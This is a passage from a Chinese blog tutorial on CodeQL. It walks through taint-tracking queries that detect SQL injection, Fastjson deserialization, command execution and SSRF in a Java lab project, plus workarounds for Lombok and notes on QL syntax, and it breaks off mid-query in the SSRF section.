class="line">isAdditionalTaintStep方法是CodeQL的类TaintTracking::Configuration提供的的方法，它的原型是：</span><br><span class="line"></span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;&#125;</span><br><span class="line"></span><br><span class="line">它的作用是将一个可控节点</span><br><span class="line">A强制传递给另外一个节点B，那么节点B也就成了可控节点。</span><br></pre></td></tr></table></figure><p>这里由于 Optional 这种类型的使用没有在 CodeQL 的语法库里，我们需要强制让 <code>username</code> 流转到<code>username.get()</code>，这样 <code>username.get()</code> 就变得可控了。这样应该就能识别出这个注入漏洞了。</p><p><strong>完整代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// 解决 SQL 注入 QL 语句的漏保</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call, MethodAccess call1|</span><br><span class="line">        expSrc = call1.getArgument(0) and expDest = call and call.getMethod() = method</span><br><span class="line">        and method.hasName(&quot;get&quot;) and method.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot;</span><br><span class="line">        and call1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;</span><br><span class="line">        )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call |</span><br><span class="line">            method.hasName(&quot;query&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)  // sink.asExpr() 是一个方法，用于将一个 sink 转换成一个表达式。这个方法通常用于在查询中使用 sink，因为查询需要将 sink 转换成表达式才能进行分析。</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">        node.getType() instanceof PrimitiveType or</span><br><span class="line">        node.getType() instanceof BoxedType or</span><br><span class="line">        node.getType() instanceof NumberType or</span><br><span class="line">        exists(ParameterizedType pt| </span><br><span class="line">            node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType</span><br><span class="line">         )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h3 id="Lombok-插件漏报"><a href="#Lombok-插件漏报" class="headerlink" title="Lombok 插件漏报"></a>Lombok 插件漏报</h3><p>Lombok 的注解并不会直接被 CodeQL 所解析，导致其中的中间链路会“中道崩殂”，我们用以下方法来解决。</p><h4 id="解决方法-①"><a href="#解决方法-①" class="headerlink" title="解决方法 ①"></a>解决方法 ①</h4><p>使用 <code>maven-delombok</code>，在 <code>pom.xml</code> 中添加以下代码，重新编译即可。（推荐）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>target/generated-sources/delombok<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>target/generated-test-sources/delombok<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">executions</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">goal</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>test-delombok<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-test-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testDelombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/test/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">executions</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SolvedLombok.png" class><h4 id="解决办法-②"><a href="#解决办法-②" class="headerlink" title="解决办法 ②"></a>解决办法 ②</h4><p>CodeQL官方的issue里面，有人给出了这个问题的解决办法 <a class="link" href="https://github.com/github/codeql/issues/4984">https://github.com/github/codeql/issues/4984<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get a copy of lombok.jar</span></span><br><span class="line">wget https://projectlombok.org/downloads/lombok.jar -O <span class="string">&quot;lombok.jar&quot;</span></span><br><span class="line"><span class="comment"># run &quot;delombok&quot; on the source files and write the generated files to a folder named &quot;delombok&quot;</span></span><br><span class="line">java -jar <span class="string">&quot;lombok.jar&quot;</span> delombok -n --onlyChanged . -d <span class="string">&quot;delombok&quot;</span></span><br><span class="line"><span class="comment"># remove &quot;generated by&quot; comments</span></span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -<span class="built_in">exec</span> sed <span class="string">&#x27;/Generated by delombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"><span class="comment"># remove any left-over import statements</span></span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -<span class="built_in">exec</span> sed <span class="string">&#x27;/import lombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"><span class="comment"># copy delombok&#x27;d files over the original ones</span></span><br><span class="line"><span class="built_in">cp</span> -r <span class="string">&quot;delombok/.&quot;</span> <span class="string">&quot;./&quot;</span></span><br><span class="line"><span class="comment"># remove the &quot;delombok&quot; folder</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="string">&quot;delombok&quot;</span></span><br></pre></td></tr></table></figure><p>没有特别明白这个应该在哪个目录下执行命令。</p><p>上面的代码，实现的功能是：去掉代码里的lombok注解，并还原setter和getter方法的java代码，从而使CodeQL的Flow流能够顺利走下去，<br>从而检索到安全漏洞。</p><h3 id="持续工程化"><a href="#持续工程化" class="headerlink" title="持续工程化"></a>持续工程化</h3><p>到此为止，我们编写了SQL注入的查询语句，消除了误报和漏报问题。当前的规则已经能够适应micro-service-seclab项目啦。</p><p>因为我们的micro-service-seclab项目，是按照标准生成的微服务结构，那么我们可以使用这个ql规则去跑其他的项目，来自动化检测其它项目，从而做到自动化检测，提高安全检测效率。</p><p>CodeQL除了提供VSCode的检测插件，也提供了大量的命令行，来实现项目的集成检测。</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create E:\Coding\CodeQL\CodeQL-Practice\database --language=<span class="string">&quot;java&quot;</span> --source-root=E:\Coding\CodeQL\micro_service_seclab --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><p>我们通过上面语句自动生成 codeql 的中间数据库(database)</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SolvedLombok.png" class><p>这里是很容易踩坑的，因为前面的语句有个问题就是 select 的返回值并非是 string，所以就会报错，报错信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error was: Expected result pattern(s) are not present <span class="keyword">for</span> problem query: Expected exactly one pattern. </span><br></pre></td></tr></table></figure><p>参考 <a class="link" href="https://xz.aliyun.com/t/10852#toc-7">https://xz.aliyun.com/t/10852#toc-7<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x04-CodeQL-进阶"><a href="#0x04-CodeQL-进阶" class="headerlink" title="0x04 CodeQL 进阶"></a>0x04 CodeQL 进阶</h2><h3 id="用-instanceof-替代复杂查询语句问题"><a href="#用-instanceof-替代复杂查询语句问题" class="headerlink" title="用 instanceof 替代复杂查询语句问题"></a>用 instanceof 替代复杂查询语句问题</h3><p>我们在上面的案例当中看到了 <code>instanceof</code>, 如果我们去看ql自带的规则库，会发现大量的 <code>instanceof</code> 语句。</p><p><code>instanceof</code> 这个关键字是用来判断当前的对象，和后面的是否为同一类型。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/instanceof.png" class><p><code>instanceof</code> 是用来优化代码结构非常好的语法糖。</p><p>这种方式的提出其实是用来优化之前使用 <code>exists(|)</code> 匹配对应 Source&#x2F;Sink，如果我们需要写非常多的 <code>exists(|)</code>，这会使得整个项目维护起来非常困难，于是就出现了这一种语法糖 <code>instanceof</code></p><p><code>instanceof</code> 给我们提供了一种机制，我们只需要定义一个 <code>abstract class</code>，比如这个案例当中的 <strong>RemoteFlowSource</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** A data flow source of remote user input. */</span><br><span class="line">abstract class RemoteFlowSource extends DataFlow::Node &#123;</span><br><span class="line">  /** Gets a string that describes the type of this remote flow source. */</span><br><span class="line">  abstract string getSourceType();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在 <code>isSource</code> 方法里进行 <code>instanceof</code>，判断 src 是 RemoteFlowSource 类型就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>学过 java 的人可能会很费解，我们继承了一个 abstract 抽象类，连个实现方法都没有，怎么就能够达到获取各种 source 的目的呢？</p><p>CodeQL 和 Java 不太一样，只要我们的子类继承了这个 RemoteFlowSource 类，那么所有子类就会被调用，它所代表的 source 也会被加载（让我想起了超级版 Fastjson，这有没有存在 CodeQL 反制一说</p><p>我们在 RemoteFlowSource 定义下面会看到非常多子类，就是这个道理，它们的结果都会被用 and 串联加载。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/autoUsed.png" class><h3 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h3><p>简单来说，有如此一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.l4yn3.microserviceseclab.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">innerOne</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">innerOne</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">innerTwo</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">innerTwo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">Nihao</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Nihao&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">Hi</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们想要根据 <code>innerTwo</code> 类定位到最外层的 <code>StudentService</code> 类，怎么实现？</p><p>按照非递归的写法，我们可以这样做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType().getEnclosingType() // getEnclosingType 获取作用域</span><br></pre></td></tr></table></figure><p>我们通过连续 2 次调用 <code>getEnclosingType()</code> 方法是能够拿到最外层的 StudentService 的。</p><p>但是正如我们所说，实际情况是我们并不清楚一共有多少层嵌套，而且多个文件可能每个的嵌套数量都不一样，我们没法用确定的调用次数来解决此问题，这个时候我们就需要使用递归的方式解决。</p><p>我们在调用方法后面加 <code>*</code> (从本身开始调用)或者 <code>+</code> (从上一级开始调用)，来解决此问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType+() // getEnclosingType 获取作用域</span><br></pre></td></tr></table></figure><p>我们也可以自己封装方法来递归调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">RefType demo(Class classes) &#123;</span><br><span class="line">    result = classes.getEnclosingType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select demo*(classes)</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SelfDefineRecursion.png" class><h3 id="强制类型转换问题（过滤需要类型）"><a href="#强制类型转换问题（过滤需要类型）" class="headerlink" title="强制类型转换问题（过滤需要类型）"></a>强制类型转换问题（过滤需要类型）</h3><p>强制类型转换这个名字有点拗口，且不太好理解，这里我更愿意把它理解成一种 filter</p><p>在 CodeQL 的规则集里，我们会看到很多类型转换的代码，比如：</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RefType.png" class><p>我们用如下 QL 语句做个测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType()</span><br></pre></td></tr></table></figure><p>以上代码的含义是打印所有方法参数的名称和类型。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/getTypes.png" class><p>如果其中我们想要单独某个类型的方法参数，这里就需要用到强制类型转换，或者说用到 filter</p><p>使用 <code>RefType()</code> 来测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(RefType)</span><br></pre></td></tr></table></figure><p>强制转换成 <code>RefType</code>，意思就是从前面的结果当中过滤出 <code>RefType</code> 类型的参数。</p><p><code>RefType</code> 是什么？引用类型，说白了就是去掉int等基础类型之后的数据。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RefTypeUse.png" class><p>同理这里肯定并不限于 RefType，也可以是其他的。比如这里保留所有的数值类型参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(IntegralType)</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/IntType.png" class><h2 id="0x05-关于其他漏洞点的-CodeQL-语句尝试"><a href="#0x05-关于其他漏洞点的-CodeQL-语句尝试" class="headerlink" title="0x05 关于其他漏洞点的 CodeQL 语句尝试"></a>0x05 关于其他漏洞点的 CodeQL 语句尝试</h2><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>依样画葫芦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name fastjson-vul</span><br><span class="line"> * @description fastjson-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class FastjsonVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    FastjsonVulConfig() &#123; this = &quot;fastjson&quot; &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call|</span><br><span class="line">            method.hasName(&quot;parseObject&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)</span><br><span class="line">            )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from FastjsonVulConfig fastjsonVul, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where fastjsonVul.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/fastjsonVul.png" class><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>写了我一会儿，经过查阅资料发现有直接现成的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name processBuilder-vul</span><br><span class="line"> * @description processBuilder-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"> class RceVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     RceVulConfig() &#123; this = &quot;RceVulConfig&quot; &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        sink.asExpr() instanceof ArgumentToExec</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> from RceVulConfig rceVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"> where rceVulConfig.hasFlowPath(source, sink)</span><br><span class="line"> select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h3 id="SSRF（重点关注）"><a href="#SSRF（重点关注）" class="headerlink" title="SSRF（重点关注）"></a>SSRF（重点关注）</h3><p>这里的内容主要是参考于这篇文章 <a class="link" href="https://forum.butian.net/share/2117">https://forum.butian.net/share/2117<i class="fas fa-external-link-alt"></i></a></p><p>还是觉得关于 SSRF 的 ql 规则这块儿，应该再记录一下，其实在之前看命令执行的 sink 的时候就没追踪到，但是那个时候并没有深入去看。</p><p>最开始我的 ql 语句是这样的<del>（很嫩的 ql 语句）</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">         exists(Method method, MethodAccess call|</span><br><span class="line">             